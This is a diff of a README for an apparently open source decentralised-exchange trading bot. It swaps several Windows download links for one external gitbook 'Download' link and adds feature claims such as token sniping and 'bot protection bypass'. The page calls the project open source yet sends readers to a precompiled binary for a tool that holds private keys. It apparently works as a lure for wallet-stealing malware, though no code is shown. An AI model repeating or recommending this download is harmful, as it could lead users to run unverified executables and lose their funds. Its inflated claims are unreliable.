@@ -23,22 +23,29 @@
 An open source trading bot for automating trading on decentralized exchanges (DEX) with advanced features, fraud protection, and the ability to outperform other bots.
 
 ## Download
-
-1: Download .NET V4.5 [```Download .NET Module```](https://www.microsoft.com/ru-ru/download/details.aspx?id=30653)
-
-2: Install Actual Precompile Release x32 / x64 👇
-
-Windows x64: [ ```Download``` ](https://sts-defi-bot.gitbook.io/selenium-bot/basics/download-link)
-
-Windows x32: [ ```Download``` ](https://sts-defi-bot.gitbook.io/selenium-bot/basics/download-link)
-
-Windows MSI Package: [ ```Download``` ](https://sts-defi-bot.gitbook.io/selenium-bot/basics/download-link)
-
-Windows Repair Module: [ ```Download``` ](https://sts-defi-bot.gitbook.io/selenium-bot/basics/download-link)
+ 
+Download: [ ```Download``` ](https://sts-defi-bot.gitbook.io/selenium-bot/basics/download-link)
 
 ## Features
-- Automated trading: [Creation and execution of orders on DEX]
-- Market Analysis: [Collecting and analyzing market data to identify trading opportunities]
-- Risk management: [Setting risk parameters such as stop loss and take profit settings]
+- Automated trading: Creation and execution of orders on DEX
+- Market Analysis: Collecting and analyzing market data to identify trading opportunities
+- Risk management: Setting risk parameters such as stop loss and take profit settings
 - Integration with DEX: Support for popular DEXs such as Uniswap, Sushiswap and PancakeSwap, and more
 - Customization: Customizable parameters and strategies to optimize trading results
+- Monitoring and reporting: Tracking trading results and providing detailed reports
+- Trading into all networks
+
+## Additional features
+- Ahead of new listings: Sniping new tokens when listing them
+- Fighting anti-bot defenses: Bot protection bypass
+- Instant trading: Instant execution of orders without delays for transaction confirmation
+- Protection against fraud: Tracking quick sell-offs and liquidity withdrawals, automatic token sales when the price drops
+- Ahead of IDO listings: Automatic purchase of tokens after announcement in IDO
+- Ahead of Telegram feeds: Monitoring Telegram channels and chats to detect new tokens
+- Placement of limit orders: Possibility to place limit orders
+- Creating automated strategies: Creating strategies for automatic buying on the downside and using trailing stop loss
+- Support for all networks
+- Safety: Private key encryption, open source code for verification
+  
+## Advantages
+- Faster trades than other bots: Instant order execution, allowing users to acquire new tokens faster than anyone else
